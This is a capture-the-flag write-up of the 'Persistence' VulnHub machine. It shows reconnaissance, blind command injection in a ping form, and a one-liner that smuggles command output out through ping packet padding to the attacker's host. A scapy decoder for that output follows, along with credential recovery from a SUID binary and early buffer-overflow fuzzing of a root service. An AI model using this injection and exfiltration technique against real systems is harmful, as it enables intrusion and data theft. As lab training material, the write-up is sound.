---
layout: post
title: "Persistence boot2root writeup"
description: "Persistence boot2root writeup"
category: writeups
tags: [boot2root, vulnhub]
---
Initial recon shows that only one port is open with a web server running

{% highlight console %}
root@kali:~# netdiscover -i eth0
Currently scanning: 192.168.70.0/16   |   Screen View: Unique Hosts

1 Captured ARP Req/Rep packets, from 1 hosts.   Total size: 102
_____________________________________________________________________________
  IP            At MAC Address     Count     Len  MAC Vendor / Hostname
-----------------------------------------------------------------------------
192.168.2.105   00:00:de:ad:be:ef      1      42  Unknown vendor
root@kali:~# unicornscan -I -mT 192.168.2.105:a;unicornscan -I -mU 192.168.2.105:a
TCP open 192.168.2.105:80  ttl 64
TCP open                    http[   80]         from 192.168.2.105  ttl 64

{% endhighlight %}
Browsing to the web server, there is a static page with an image.
After a little bit of enumeration we find one other page on the web server(debug.php).
{% highlight bash %}
root@kali:~# nikto -h 192.168.2.105 -C all
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.2.105
+ Target Hostname:    192.168.2.105
+ Target Port:        80
+ Start Time:         2016-06-12 00:50:51 (GMT-4)
---------------------------------------------------------------------------
+ Server: nginx/1.4.7
+ Server leaks inodes via ETags, header found with file /, fields: 0x531fe71e 0x187 
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Retrieved x-powered-by header: PHP/5.3.3
+ /debug.php: Possible debug directory/program found.
+ 26171 requests: 6 error(s) and 6 item(s) reported on remote host
+ End Time:           2016-06-12 00:51:18 (GMT-4) (27 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
{% endhighlight %}
Browsing to the page we find a web page which allows us to ping an inputted IP address. <img src="{{site.url}}/assets/debug_php.png">
I was able to verify that the ping command was working by running a packet capture when I submitted my query
{% highlight console %}
root@kali:~# tcpdump -i eth0 'icmp'
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth0, link-type EN10MB (Ethernet), capture size 262144 bytes
00:53:29.550594 IP 192.168.2.105 > kali: ICMP echo request, id 61956, seq 1, length 64
00:53:29.550607 IP kali > 192.168.2.105: ICMP echo reply, id 61956, seq 1, length 64
00:53:30.550244 IP 192.168.2.105 > kali: ICMP echo request, id 61956, seq 2, length 64
00:53:30.550267 IP kali > 192.168.2.105: ICMP echo reply, id 61956, seq 2, length 64
00:53:31.550275 IP 192.168.2.105 > kali: ICMP echo request, id 61956, seq 3, length 64
00:53:31.550297 IP kali > 192.168.2.105: ICMP echo reply, id 61956, seq 3, length 64
00:53:32.550300 IP 192.168.2.105 > kali: ICMP echo request, id 61956, seq 4, length 64
00:53:32.550320 IP kali > 192.168.2.105: ICMP echo reply, id 61956, seq 4, length 64
{% endhighlight %}
After experimenting with various inputs I found that you can inject commands by appending a semicolon and adding additional commands.
The only issue is we have blind command injection as the page does not return the output of the commands.
After reading the man page for ping, there is one interesting arguments which can be used to transmit our command output.
The "-p" ping argument allows you specify 16 bytes to fill out the packet you send.
By abusing the "-p" argument and encoding the results of a command we have a working a shell.
Initially, I was trying to transmit 16 bytes at a time but faced issues when decoding a payload which was smaller than 16 bytes.
I gave up transmitting 16 bytes at a time and ended up only transmitting 1 byte at a time.
The below command will stop the first command, execute a command of our choosing and encode the command results in a series of ping packets
{% highlight bash %}
;PAYLOADS=$(ls -l 2>&1 | xxd -c 16 -ps); for PAYLOAD in $PAYLOADS; do ping -c 1 -p $PAYLOAD 192.168.2.103; done
{% endhighlight %}
Initially I was thinking of decoding the ping packets using a shell script with tshark but settled with scapy.
I hacked together the following script which will capture the ping packets, decode them and print the command injected command's output.
{% highlight python %}
#!/usr/bin/env python2
from scapy.all import *

while True:
    packetcapture = sniff(timeout=1, filter='icmp[icmptype] == 8')
    for packet in packetcapture:
        if packet.haslayer(ICMP) and packet.getlayer(ICMP).type == 8:
            sys.stdout.write(packet.getlayer(ICMP).load[8])
{% endhighlight %}
The script will output your command output similar to the following.
{% highlight console %}
root@kali:~# ./persistence-ping-decode.py
WARNING: No route found for IPv6 destination :: (no default route?)
uid=498(nginx) gid=498(nginx) groups=498(nginx)
Linux persistence 2.6.32-431.5.1.el6.i686 #1 SMP Tue Feb 11 21:56:33 UTC 2014 i686 i686 i386 GNU/Linux
/usr/share/nginx/html
total 160
-rwxr-xr-x. 1 root root    439 Mar 17  2014 debug.php
-rw-r--r--. 1 root root    391 Mar 12  2014 index.html
-rw-r--r--. 1 root root 146545 Mar 12  2014 persistence_of_memory_by_tesparg-d4qo048.jpg
-rwsr-xr-x. 1 root root   5757 Mar 17  2014 sysadmin-tool
{% endhighlight %}
After getting the ping decode script working, I explored the file system a little bit.
It appeared that nginx was running inside of a chroot with only a few commands avaliable to us.
It also appeared that there was a local firewall dropping traffic.
I ended up downloading the interesting looking 'sysadmin-tool' binary which was being hosted and started investigating.
What was interesting is that that binary has the SUID bit set.
I ran strings against the binary which revealed the following interesting strings:
{% highlight console %}
Usage: sysadmin-tool --activate-service
--activate-service
breakout
/bin/sed -i 's/^#//' /etc/sysconfig/iptables
/sbin/iptables-restore < /etc/sysconfig/iptables
Service started...
Use avida:dollars to access.
/nginx/usr/share/nginx/html/breakout
{% endhighlight %}
It appears that the binary will disable the local firewall and provide login credentials.
I proceeded to run the binary and expected it disabled the local firewall and provided provided login credentials.
{% highlight console %}
root@kali:~# ./persistence-ping-decode.py
WARNING: No route found for IPv6 destination :: (no default route?)
Service started...
Use avida:dollars to access.
{% endhighlight %}
After a quick port scan, we see that SSH is now open. If you SSH in using the provided credentials you'll be dropped into a rbash shell.
{% highlight console %}
root@kali:~# unicornscan -I -mT 192.168.2.105:a;unicornscan -I -mU 192.168.2.105:a
TCP open 192.168.2.105:80  ttl 64
TCP open 192.168.2.105:22  ttl 64
TCP open                     ssh[   22]         from 192.168.2.105  ttl 64
TCP open                    http[   80]         from 192.168.2.105  ttl 64
{% endhighlight %}
Looking around you can see there is a custom program named "wopr" running as root.
{% highlight console %}
-rbash-4.1$ ps aux | grep wopr
root      1092  0.0  0.0   2004   408 ?        S    05:54   0:00 /usr/local/bin/wopr
avida     2149  0.0  0.0   4356   732 pts/0    S+   06:48   0:00 grep wopr
{% endhighlight %}
I proceeded to download the binary and check for bufferoverflows.
{% highlight console %}
root@kali:~# ssh avida@192.168.2.105 "cat /usr/local/bin/wopr" > wopr
avida@192.168.2.105's password:
root@kali:~# ./wopr
[+] bind complete
[+] waiting for connections
[+] logging queries to $TMPLOG
[+] got a connection
*** stack smashing detected ***: ./wopr terminated
======= Backtrace: =========
/lib/i386-linux-gnu/libc.so.6(+0x6929b)[0xf75f329b]
/lib/i386-linux-gnu/libc.so.6(__fortify_fail+0x37)[0xf7682eb7]
/lib/i386-linux-gnu/libc.so.6(+0xf8e78)[0xf7682e78]
./wopr[0x80487dc]
[0x41414141]
======= Memory map: ========
08048000-08049000 r-xp 00000000 fe:01 1705762                            /root/wopr
08049000-0804a000 r--p 00000000 fe:01 1705762                            /root/wopr
0804a000-0804b000 rw-p 00001000 fe:01 1705762                            /root/wopr
084b4000-084d5000 rw-p 00000000 00:00 0                                  [heap]
f7589000-f758a000 rw-p 00000000 00:00 0
f758a000-f773b000 r-xp 00000000 fe:01 272686                             /lib/i386-linux-gnu/libc-2.22.so
f773b000-f773c000 ---p 001b1000 fe:01 272686                             /lib/i386-linux-gnu/libc-2.22.so
f773c000-f773e000 r--p 001b1000 fe:01 272686                             /lib/i386-linux-gnu/libc-2.22.so
f773e000-f773f000 rw-p 001b3000 fe:01 272686                             /lib/i386-linux-gnu/libc-2.22.so
f773f000-f7742000 rw-p 00000000 00:00 0
f7747000-f7763000 r-xp 00000000 fe:01 265577                             /lib/i386-linux-gnu/libgcc_s.so.1
f7763000-f7764000 rw-p 0001b000 fe:01 265577                             /lib/i386-linux-gnu/libgcc_s.so.1
f7764000-f7765000 rw-p 00000000 00:00 0
f7765000-f7768000 rw-p 00000000 00:00 0
f7768000-f776b000 r--p 00000000 00:00 0                                  [vvar]
f776b000-f776d000 r-xp 00000000 00:00 0                                  [vdso]
f776d000-f778f000 r-xp 00000000 fe:01 272682                             /lib/i386-linux-gnu/ld-2.22.so
f778f000-f7790000 r--p 00021000 fe:01 272682                             /lib/i386-linux-gnu/ld-2.22.so
f7790000-f7791000 rw-p 00022000 fe:01 272682                             /lib/i386-linux-gnu/ld-2.22.so
ffca8000-ffcc9000 rw-p 00000000 00:00 0                                  [stack]
root@kali:~# python -c 'print "A"*1024' | nc localhost 3333
[+] hello, my name is sploitable
[+] would you like to play a game?
> [+] yeah, I don't think so
{% endhighlight %}
# TODO: Build a working exploit
